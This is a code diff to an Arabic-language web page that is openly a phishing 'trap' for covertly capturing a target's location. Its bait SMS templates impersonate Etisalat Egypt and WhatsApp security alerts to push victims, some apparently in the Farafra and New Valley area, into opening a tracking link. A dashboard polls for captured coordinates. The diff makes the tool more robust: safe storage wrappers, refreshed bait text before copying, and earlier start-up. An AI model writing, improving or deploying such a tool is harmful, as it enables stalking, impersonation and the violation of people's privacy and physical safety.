@@ -191,7 +191,7 @@
                         عشان المصيدة تشتغل بدون خطأ 404، ارفعي هذا الملف على استضافتكِ المعتادة واكتبي رابط صفحتكِ المباشر بالأسفل ليقوم النظام بربط قاعدة البيانات تلقائياً:
                     </p>
                     <div class="flex flex-col sm:flex-row gap-2">
-                        <input type="url" id="custom-base-url" placeholder="مثال: https://yoursite.com/tracker.html" class="flex-1 p-2.5 bg-black border border-gray-800 rounded-lg text-xs font-semibold focus:outline-none focus:border-[#FF91A4] text-[#FF91A4]">
+                        <input type="url" id="custom-base-url" placeholder="مثال: https://se-sweet.vercel.app" class="flex-1 p-2.5 bg-black border border-gray-800 rounded-lg text-xs font-semibold focus:outline-none focus:border-[#FF91A4] text-[#FF91A4]">
                         <button onclick="applyCustomBaseUrl()" class="btn-pink font-bold px-5 py-2.5 rounded-lg text-xs transition-all">تحديث ⚙️</button>
                     </div>
                 </div>
@@ -337,13 +337,34 @@
         let map = null;
         let marker = null;
 
+        // Defensive helper functions for sandboxed localStorage environments
+        function safeGetItem(key) {
+            try {
+                return localStorage.getItem(key);
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function safeSetItem(key, value) {
+            try {
+                localStorage.setItem(key, value);
+            } catch (e) {}
+        }
+
+        function safeRemoveItem(key) {
+            try {
+                localStorage.removeItem(key);
+            } catch (e) {}
+        }
+
         const smsTemplates = {
             1: "تنبيه أمني عاجل: تم رصد تشغيل غير مطابق للرقم التسلسلي بهاتف الأندرويد/الآيفون الحالي. لمنع قفل الهاتف ومسح شريحة اتصالات مصر نهائياً، يرجى تفعيل الحماية وفصل حساب المالك القديم فوراً من الرابط الآمن: ",
             2: "اتصالات مصر: تنبيه هام لعملائنا بالفرافرة والوادي الجديد، جاري صيانة دورية لأبراج الـ 4G لتعزيز السرعة وتجنب سقوط التغطية عن خطك. يرجى تفعيل ومعايرة الشبكة جغرافياً من الرابط: ",
             3: "تنبيه أمان واتساب: محاولة نشطة جارية لربط حسابك وتنزيل صورك ومحادثاتك الشخصية من جهاز كمبيوتر خارجي. اضغط لمنع الاختراق وحظر الارتباط وحماية خصوصيتك فوراً: "
         };
 
-        // Initialize session parameters and clean up potential Arabic copy-paste letters (e.g. "لم")
+        // Initialize session parameters defensively
         function initTracker() {
             const urlParams = new URLSearchParams(window.location.search);
             let sessionParam = urlParams.get('session');
@@ -364,25 +385,27 @@
                 activeSessionId = sessionParam;
             } else {
                 // View as Coordinator/Mother
-                let session = localStorage.getItem('social_tracker_session_v6');
+                let session = safeGetItem('social_tracker_session_v6');
                 if (!session) {
                     session = 'session_' + Math.random().toString(36).substring(2, 11);
-                    localStorage.setItem('social_tracker_session_v6', session);
+                    safeSetItem('social_tracker_session_v6', session);
                 }
                 activeSessionId = session;
 
-                const savedUrl = localStorage.getItem('custom_base_url_tracker_v6');
+                const savedUrl = safeGetItem('custom_base_url_tracker_v6');
                 if (savedUrl) {
                     document.getElementById('custom-base-url').value = savedUrl;
                 }
+                
+                // Forces update to ensure text updates immediately even if fallback occurs
                 updateBaitElements();
                 startLiveDashboardPolling(activeSessionId);
             }
         }
 
-        // Dynamically build bait links and SMS texts
+        // Dynamically build bait links and SMS texts safely
         function updateBaitElements() {
-            const savedUrl = localStorage.getItem('custom_base_url_tracker_v6');
+            const savedUrl = safeGetItem('custom_base_url_tracker_v6');
             let cleanUrl = window.location.href.split('?')[0];
             
             if (savedUrl && savedUrl.trim() !== "") {
@@ -399,11 +422,11 @@
         window.applyCustomBaseUrl = function() {
             const inputUrl = document.getElementById('custom-base-url').value.trim();
             if (inputUrl === "") {
-                localStorage.removeItem('custom_base_url_tracker_v6');
+                safeRemoveItem('custom_base_url_tracker_v6');
                 writeTerminalLog("[INFO] تمت إعادة تعيين الرابط الافتراضي الداخلي.");
                 showToast("تم إلغاء الرابط المخصص والعودة للرابط الافتراضي.");
             } else {
-                localStorage.setItem('custom_base_url_tracker_v6', inputUrl);
+                safeSetItem('custom_base_url_tracker_v6', inputUrl);
                 writeTerminalLog(`[INFO] تم تعيين رابط مخصص جديد: ${inputUrl}`);
                 showToast("تم تثبيت وتحديث روابط المصيدة بنجاح!");
             }
@@ -481,7 +504,7 @@
                         }
                     }
                 } catch (err) {
-                    // Fail silently to prevent console logging
+                    // Fail silently
                 }
             }, 3000);
         }
@@ -556,6 +579,8 @@
         }
 
         window.copyOnlyLink = function() {
+            // Safe manual generation check before copying
+            updateBaitElements();
             const finalUrl = document.getElementById('final-trap-url');
             finalUrl.select();
             document.execCommand('copy');
@@ -563,6 +588,8 @@
         }
 
         window.copyFullBaitSms = function() {
+            // Force update to make sure text is populated correctly before copying
+            updateBaitElements();
             const textToCopy = document.getElementById('sms-bait-text').innerText;
             const tempArea = document.createElement('textarea');
             tempArea.value = textToCopy;
@@ -576,7 +603,6 @@
         // Simulated/Local preview function to help users test the amazing interface
         window.simulateSuccessGrab = function() {
             writeTerminalLog("[SIMULATION] بدء توليد إحداثيات محاكاة تفاعلية للفرافرة...");
-            // Simulated coordinates for central Farafra oasis area
             const simLat = 27.0583;
             const simLng = 27.9711;
             const simAccuracy = 10;
@@ -598,9 +624,13 @@
             }, 4000);
         }
 
-        window.onload = function() {
+        // Execute immediately and securely to bypass any slow frames loads
+        if (document.readyState === 'complete' || document.readyState === 'interactive') {
             initTracker();
-        };
+        } else {
+            window.addEventListener('DOMContentLoaded', initTracker);
+        }
     </script>
 </body>
 </html>
+
